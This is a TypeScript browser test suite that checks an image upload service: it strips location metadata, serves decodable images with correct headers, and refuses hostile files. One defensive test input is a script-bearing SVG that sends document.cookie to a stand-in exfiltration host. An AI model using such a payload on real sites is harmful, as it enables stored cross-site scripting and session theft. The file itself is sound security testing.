/**
 * User-uploaded images, in a real browser, through the real gateway, decoded by a real decoder.
 *
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 * **THE UPLOAD IS PERFORMED BY THE PAGE, NOT BY THIS PROCESS, AND THAT IS THE ENTIRE POINT.**
 *
 * A `fetch` from Node to `studio` would prove that studio accepts an image. It would prove nothing
 * about the thing that actually breaks: a browser upload is a CROSS-ORIGIN request carrying an
 * `Authorization` header, so it is preflighted, and a missing `Access-Control-Allow-Headers` or an
 * unrouted host turns a working service into a feature that cannot be used by anybody. Node's
 * `fetch` does not preflight and does not enforce CORS, so it is structurally incapable of noticing
 * either. `page.evaluate` puts the request inside Chromium, where both are enforced.
 *
 * The same argument decides how the RESULT is checked. Asserting that the response body has some
 * length would pass on a truncated file, on an HTML error page served with a 200, and on bytes this
 * service corrupted while stripping their metadata. So the assertion is that the browser DECODED
 * the image: an `<img>` is pointed at the returned URL and `naturalWidth` is read back. That number
 * is non-zero only if Chromium's own decoder accepted the bytes — which makes it, in one read, a
 * check that the strip did not corrupt the file, that the `Content-Type` is right, and that
 * `nosniff` did not cause the browser to refuse its own image.
 *
 * ── NOTHING HERE IS INTERCEPTED ────────────────────────────────────────────────────────────────
 *
 * There is no `page.route`, no `route.fulfill` and no fixture in this file, for the reason
 * `smoke.ts` sets out at length: a suite that answers its own requests cannot see that the API is
 * down. `smoke.test.ts` asserts the absence of those strings across this tier as text, so this file
 * is held to it too.
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 *
 * ## The negative cases are the reason this file is worth its cost
 *
 * `studio` refuses SVG outright, because an SVG is a script document and serving one from an origin
 * that holds a session is stored cross-site scripting rather than a picture. It also refuses
 * anything whose magic bytes are not PNG, JPEG or WebP, regardless of the `Content-Type` the client
 * asserts.
 *
 * Both refusals are exercised here THROUGH A BROWSER, and both are declared as `outcome: 'refusal'`
 * so a green means "the estate said no" rather than "nothing happened". An upload validator with no
 * rejection test is a check that cannot fail, which is this estate's most common defect class; a
 * rejection test that runs only in the service's own unit suite cannot see a gateway that strips the
 * status and answers 200, which is the version of that defect this tier exists to catch.
 */

import type { JourneyContext, JourneyDefinition } from '../journeys.ts'
import { GROUPS } from '../groups.ts'
import type { BrowserConfig, BrowserPage } from './driver.ts'
import type { Scenario } from './catalogue.ts'
import { browserAvailable, withPage } from './driver.ts'
import { syntheticCredential } from './fixtures.ts'
import { wait, waitMsFor } from './backoff.ts'

/* ------------------------------------------------------------------ fixtures, built here */

/**
 * A real PNG, assembled byte by byte, carrying a location in an `eXIf` chunk.
 *
 * Built rather than committed, for the reason `studio/src/imagebytes.test.ts` gives: a checked-in
 * photograph with real GPS in it would be somebody's actual location committed to a public
 * repository, and a binary fixture cannot be reviewed in a diff. The CRCs are computed, so this is
 * a file a decoder will genuinely accept — which matters here, because the assertion is that a
 * decoder genuinely accepted it.
 */
function crc32(bytes: Uint8Array): number {
  let crc = 0xffffffff
  for (const byte of bytes) {
    crc ^= byte
    for (let i = 0; i < 8; i += 1) crc = crc & 1 ? (crc >>> 1) ^ 0xedb88320 : crc >>> 1
  }
  return (crc ^ 0xffffffff) >>> 0
}

function pngChunk(type: string, data: Uint8Array): Uint8Array {
  const out = new Uint8Array(12 + data.length)
  const view = new DataView(out.buffer)
  view.setUint32(0, data.length)
  for (let i = 0; i < 4; i += 1) out[4 + i] = type.charCodeAt(i)
  out.set(data, 8)
  view.setUint32(8 + data.length, crc32(out.subarray(4, 8 + data.length)))
  return out
}

/** The width and height the fixture declares. Read back off the decoded image, so it is pinned. */
export const FIXTURE_WIDTH = 320
export const FIXTURE_HEIGHT = 240

/** The location bytes the service must remove. Asserted absent from what the browser received. */
export const FIXTURE_LOCATION = 'GPSLatitude=51.5074,GPSLongitude=-0.1278'

export function locatedPng(): Uint8Array {
  const ihdr = new Uint8Array(13)
  const view = new DataView(ihdr.buffer)
  view.setUint32(0, FIXTURE_WIDTH)
  view.setUint32(4, FIXTURE_HEIGHT)
  ihdr[8] = 8
  ihdr[9] = 6
  const parts = [
    new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk('IHDR', ihdr),
    pngChunk('eXIf', new TextEncoder().encode(FIXTURE_LOCATION)),
    pngChunk('IDAT', new Uint8Array([0x78, 0x9c, 0x63, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01])),
    pngChunk('IEND', new Uint8Array(0)),
  ]
  const total = parts.reduce((n, p) => n + p.length, 0)
  const out = new Uint8Array(total)
  let at = 0
  for (const part of parts) {
    out.set(part, at)
    at += part.length
  }
  return out
}

/** An SVG carrying a script, presented later as `image/png`. The stored-XSS payload, refused. */
export const HOSTILE_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg" width="320" height="240" ' +
  'onload="fetch(\'https://exfiltrate.example/\'+document.cookie)"><script>alert(1)</script></svg>'

/**
 * Not an image in any format. The magic-byte case.
 *
 * **The DOS header is spelled as escapes, never as the bytes themselves.** It used to hold the raw
 * `90 00 03`, and a file containing a NUL is not the text it appears to be: `grep` skips it in
 * silence, and micro-conformance's body scan refuses it outright — which is exactly what that
 * check is for, and which took the estate-wide route scan down with it, so no ratchet ran at all
 * (`conformance/src/bodyscan.ts`, micro-org#262). The value is byte-identical either way; only one
 * of the two spellings can be read by the tools that have to read it.
 */
export const NOT_AN_IMAGE = 'MZ\u0090\u0000\u0003 this is a portable executable, not a picture'

/* ------------------------------------------------------------------ an account to upload as */

/**
 * Register a fresh account and return its bearer token.
 *
 * Deliberately NOT `fixtures.fundAccount`. That helper needs `BEACON_ESTATE_OPERATOR` because it
 * mints a service token to credit a ledger balance — and an image upload costs nothing, touches no
 * ledger and needs no operator. Reusing it would make this journey SKIP wherever that credential is
 * unset, which is a not-run reported as a not-applicable for a reason that has nothing to do with
 * images. `journeys.ts` rule 2 is that not-run is not passed; the cheapest way to honour it here is
 * to need less.
 *
 * The registration limiter is honoured the same way `fundAccount` honours it: identity caps
 * `/auth/register` and names its own `retry-after`, so a throttled fixture waits the service's
 * number rather than reporting the product broken.
 */
async function registerUploader(ctx: JourneyContext): Promise<string> {
  const base = ctx.target('identity').replace(/\/+$/, '')
  const who = syntheticCredential(ctx, 'media')

  let response: Response | null = null
  for (let attempt = 0; attempt < 4; attempt += 1) {
    response = await fetch(`${base}/auth/register`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(who),
      signal: AbortSignal.any([ctx.signal, AbortSignal.timeout(20_000)]),
    })
    if (response.status !== 429) break
    await response.arrayBuffer()
    // `browser/backoff.ts`, like every other caller in this tier — not a `setTimeout` here. Rule 8
    // bans one outside that file, and this line evaded the ban for as long as it did only because
    // the raw NUL further up made the whole file binary to `grep`. The helper clamps to
    // `MAX_WAIT_MS` and takes the journey's own signal, so an abandoned run stops waiting; the
    // hand-rolled sleep it replaces did neither. micro-org#262.
    await wait(waitMsFor(response.headers.get('retry-after')), ctx.signal)
  }
  if (response === null || !response.ok) {
    throw new Error(
      `could not register the journey's account (HTTP ${response?.status ?? 'no response'}) — ` +
        'this is the fixture, not the product',
    )
  }
  const body = (await response.json()) as { accessToken?: unknown }
  const token = typeof body.accessToken === 'string' ? body.accessToken : ''
  if (token === '') throw new Error('identity registered the account and issued no access token')
  return token
}

/* ------------------------------------------------------------------ what the page does */

/**
 * The argument handed across the process boundary into Chromium.
 *
 * `page.evaluate` serialises the function source, so nothing from this process is in scope inside
 * it. Everything the page needs travels in this object — and the image travels as an array of
 * numbers rather than a `Uint8Array`, because the boundary is structured-clone over a JSON-shaped
 * protocol and a typed array does not survive it intact.
 */
export interface UploadRequest {
  readonly studioBase: string
  readonly token: string
  readonly bytes: readonly number[]
  readonly contentType: string
  readonly visibility: string
}

export interface UploadReport {
  readonly status: number
  readonly reason: string
  readonly bytesUrl: string
  readonly checksum: string
  readonly anchorState: string
  readonly strippedBytes: number
  readonly failure: string
}

/**
 * Run inside the browser. Uploads, and reports what the estate answered.
 *
 * The `Content-Type` is whatever the caller asserts — including `image/png` on an SVG — because the
 * property under test is that the service reads the BYTES and disregards the claim.
 */
export async function uploadInPage(request: UploadRequest): Promise<UploadReport> {
  const empty: UploadReport = {
    status: 0,
    reason: '',
    bytesUrl: '',
    checksum: '',
    anchorState: '',
    strippedBytes: -1,
    failure: '',
  }
  try {
    const body = new Uint8Array(request.bytes)
    const response = await fetch(
      `${request.studioBase}/v1/uploads?visibility=${encodeURIComponent(request.visibility)}`,
      {
        method: 'POST',
        headers: { 'content-type': request.contentType, authorization: `Bearer ${request.token}` },
        body,
      },
    )
    const text = await response.text()
    let parsed: Record<string, unknown> = {}
    try {
      parsed = JSON.parse(text) as Record<string, unknown>
    } catch {
      return { ...empty, status: response.status, failure: `not JSON: ${text.slice(0, 200)}` }
    }
    const asset = (parsed['asset'] ?? {}) as Record<string, unknown>
    const anchor = (asset['anchor'] ?? {}) as Record<string, unknown>
    const error = (parsed['error'] ?? {}) as Record<string, unknown>
    return {
      status: response.status,
      reason: typeof error['reason'] === 'string' ? error['reason'] : '',
      bytesUrl: typeof parsed['bytesUrl'] === 'string' ? parsed['bytesUrl'] : '',
      checksum: typeof asset['checksum'] === 'string' ? asset['checksum'] : '',
      anchorState: typeof anchor['state'] === 'string' ? anchor['state'] : '',
      strippedBytes:
        typeof parsed['metadataStrippedBytes'] === 'number' ? parsed['metadataStrippedBytes'] : -1,
      failure: '',
    }
  } catch (err) {
    // A CORS refusal, a DNS failure or an unrouted host lands here as a TypeError with almost no
    // detail — which is itself the finding, so it is reported rather than thrown.
    return { ...empty, failure: err instanceof Error ? err.message : String(err) }
  }
}

export interface RenderReport {
  readonly width: number
  readonly height: number
  readonly failure: string
  readonly contentType: string
  readonly nosniff: string
  readonly carriesLocation: boolean
}

export interface RenderRequest {
  readonly url: string
  readonly location: string
}

/**
 * Run inside the browser. Loads the URL as an IMAGE and reports what the decoder made of it.
 *
 * Two fetches of the same URL, deliberately: the `<img>` proves the browser will render it in the
 * position a product actually uses, and the `fetch` reads the response headers, which an `<img>`
 * does not expose to script. The second is also where the privacy claim is checked — against the
 * bytes that came over the wire, not against a field in the upload response saying stripping
 * happened.
 */
export async function renderInPage(request: RenderRequest): Promise<RenderReport> {
  const empty: RenderReport = {
    width: 0,
    height: 0,
    failure: '',
    contentType: '',
    nosniff: '',
    carriesLocation: false,
  }
  try {
    const decoded = await new Promise<{ w: number; h: number }>((resolve, reject) => {
      const img = new Image()
      img.onload = () => resolve({ w: img.naturalWidth, h: img.naturalHeight })
      img.onerror = () => reject(new Error('the browser refused to decode the image'))
      img.src = request.url
    })

    const response = await fetch(request.url)
    const buffer = new Uint8Array(await response.arrayBuffer())
    // A byte-wise search for the location, over exactly what was served.
    const needle = new TextEncoder().encode(request.location)
    let found = false
    for (let i = 0; i + needle.length <= buffer.length && !found; i += 1) {
      let match = true
      for (let j = 0; j < needle.length; j += 1) {
        if (buffer[i + j] !== needle[j]) {
          match = false
          break
        }
      }
      found = match
    }

    return {
      width: decoded.w,
      height: decoded.h,
      failure: '',
      contentType: response.headers.get('content-type') ?? '',
      nosniff: response.headers.get('x-content-type-options') ?? '',
      carriesLocation: found,
    }
  } catch (err) {
    return { ...empty, failure: err instanceof Error ? err.message : String(err) }
  }
}

/* ------------------------------------------------------------------ the journeys */

type Implementation = (
  config: BrowserConfig,
  scenario: Scenario,
  operator: unknown,
) => JourneyDefinition

/**
 * Open a page on a surface the estate really serves, so the upload happens from a real origin.
 *
 * It matters WHICH origin. The gateway's CORS allow-list is a fixed set of surface hostnames
 * (`deploy/gateway/dynamic/policy.yml`), so running this from `about:blank` or from a page this
 * harness served would exercise an origin no product uses and would pass while every real caller
 * was refused.
 */
async function onSurface(
  ctx: JourneyContext,
  config: BrowserConfig,
  surface: string,
  fn: (page: BrowserPage, studioBase: string, token: string) => Promise<void>,
): Promise<void> {
  const availability = await browserAvailable(config)
  if (!availability.ok) ctx.skip(availability.reason)

  const surfaceUrl = ctx.target(surface).replace(/\/+$/, '')
  const studioBase = ctx.target('studio').replace(/\/+$/, '')
  const token = await ctx.step('register an account to upload as', () => registerUploader(ctx))

  await withPage(config, async (page) => {
    await ctx.step('open the surface', async () => {
      const response = await page.goto(surfaceUrl, { waitUntil: 'domcontentloaded' })
      ctx.assert(response !== null, `no response at all from ${surfaceUrl}`)
      ctx.assert(
        (response as { ok(): boolean; status(): number }).ok(),
        `${surfaceUrl} returned HTTP ${(response as { status(): number }).status()}`,
      )
    })
    await fn(page, studioBase, token)
  })
}

const uploadRenders =
  (surface: string, group: string): Implementation =>
  (config, scenario) => ({
    name: `browser.${scenario.id.toLowerCase()}`,
    title: scenario.title,
    productGroup: group,
    service: 'studio',
    critical: scenario.gate,
    deadlineMs: 120_000,
    async run(ctx) {
      await onSurface(ctx, config, surface, async (page, studioBase, token) => {
        const report = await ctx.step('upload an image from the page', async () =>
          page.evaluate<Promise<UploadReport>, UploadRequest>(uploadInPage, {
            studioBase,
            token,
            bytes: Array.from(locatedPng()),
            contentType: 'image/png',
            visibility: 'public',
          }),
        )

        ctx.assert(
          report.failure === '',
          `the browser could not complete the upload at all: ${report.failure} — this is a CORS ` +
            `preflight, DNS or routing failure rather than a refusal, and studio must be routed ` +
            `at a host the ${surface} origin is allowed to call`,
        )
        ctx.assert(report.status === 201, `studio answered HTTP ${report.status}, expected 201`)
        ctx.assert(report.bytesUrl !== '', 'the upload response carried no bytesUrl')
        ctx.assert(
          /^sha256:[0-9a-f]{64}$/.test(report.checksum),
          `the checksum is not the estate's spelling: ${report.checksum}`,
        )
        ctx.assert(
          report.strippedBytes > 0,
          'nothing was stripped from an image that arrived carrying a location',
        )
        // ══════════════════════════════════════════════════════════════════════════════════════
        // THE HONESTY ASSERTION, MADE AGAINST THE LIVE ESTATE.
        //
        // Hearth has no Registry of Authorship contract — `tessera/src/kiln.ts` records
        // that the Solidity has never been written — so an uploaded image has a recorded content
        // address and NOT a chain attestation. Anything reporting otherwise is a check that always
        // passes, on a platform that custodies real money. This is the test that goes red the day
        // somebody fills the anchor columns in with something plausible.
        // ══════════════════════════════════════════════════════════════════════════════════════
        ctx.assert(
          report.anchorState === 'unanchored',
          `the estate reports an image as "${report.anchorState}" when no contract exists to ` +
            'anchor it — an image has a recorded hash, not a chain attestation',
        )

        const absolute = report.bytesUrl.startsWith('http')
          ? report.bytesUrl
          : `${studioBase}${report.bytesUrl}`

        const rendered = await ctx.step('the browser decodes the served image', async () =>
          page.evaluate<Promise<RenderReport>, RenderRequest>(renderInPage, {
            url: absolute,
            location: FIXTURE_LOCATION,
          }),
        )

        ctx.assert(rendered.failure === '', `the image did not render: ${rendered.failure}`)
        // Non-zero only if Chromium's own decoder accepted the bytes. See the file header.
        ctx.assert(
          rendered.width === FIXTURE_WIDTH && rendered.height === FIXTURE_HEIGHT,
          `the decoded image is ${rendered.width}x${rendered.height}, expected ` +
            `${FIXTURE_WIDTH}x${FIXTURE_HEIGHT} — the stored bytes are not the image that was sent`,
        )
        ctx.assert(
          rendered.contentType.startsWith('image/'),
          `the bytes were served as ${rendered.contentType}`,
        )
        ctx.assert(
          rendered.nosniff === 'nosniff',
          'X-Content-Type-Options: nosniff is missing from user-uploaded content',
        )
        ctx.assert(
          !rendered.carriesLocation,
          'the location the image was uploaded with is present in the bytes the estate served — ' +
            'this is a live privacy leak, not a test failure',
        )
      })
    },
  })

const refusesHostileUpload =
  (surface: string, group: string): Implementation =>
  (config, scenario) => ({
    name: `browser.${scenario.id.toLowerCase()}`,
    title: scenario.title,
    productGroup: group,
    service: 'studio',
    critical: scenario.gate,
    deadlineMs: 120_000,
    async run(ctx) {
      await onSurface(ctx, config, surface, async (page, studioBase, token) => {
        /**
         * Both hostile bodies are declared `image/png`. A service that trusted the header would
         * accept both, and this is the only tier that can prove the deployed one does not.
         */
        const cases = [
          {
            step: 'a script-bearing SVG is refused',
            bytes: Array.from(new TextEncoder().encode(HOSTILE_SVG)),
            expect: 'svg_refused',
            why:
              'an SVG is a script document, and serving one from an origin that holds a session ' +
              'is stored cross-site scripting',
          },
          {
            step: 'a file with the wrong magic bytes is refused',
            bytes: Array.from(new TextEncoder().encode(NOT_AN_IMAGE)),
            expect: 'unrecognised_format',
            why: 'the format must be read from the bytes, never from the Content-Type header',
          },
        ] as const

        for (const hostile of cases) {
          const report = await ctx.step(hostile.step, async () =>
            page.evaluate<Promise<UploadReport>, UploadRequest>(uploadInPage, {
              studioBase,
              token,
              bytes: hostile.bytes,
              contentType: 'image/png',
              visibility: 'public',
            }),
          )

          ctx.assert(
            report.failure === '',
            `the browser could not complete the upload at all: ${report.failure}`,
          )
          ctx.assert(
            report.status === 400,
            `studio answered HTTP ${report.status} to hostile content, expected 400 — ${hostile.why}`,
          )
          ctx.assert(
            report.reason === hostile.expect,
            `the refusal was "${report.reason}", expected "${hostile.expect}" — a refusal for the ` +
              'wrong reason is a check that happens to pass',
          )
          ctx.assert(
            report.bytesUrl === '',
            'a refused upload was nonetheless given a URL to fetch it back from',
          )
        }
      })
    },
  })

/**
 * The scenarios this file implements.
 *
 * `market` and `foresight` are driven separately rather than folded into one: the origins differ,
 * and the gateway's CORS allow-list is per-origin, so one passing tells you nothing about the
 * other. That is precisely the failure this tier exists to catch.
 */
export const MEDIA_IMPLEMENTATIONS: Readonly<Record<string, Implementation>> = {
  'BJ-MED-01': uploadRenders('market', GROUPS.market),
  'BJ-MED-02': refusesHostileUpload('market', GROUPS.market),
  'BJ-MED-03': uploadRenders('foresight', GROUPS.foresight),
}

export type { Implementation as MediaImplementation }
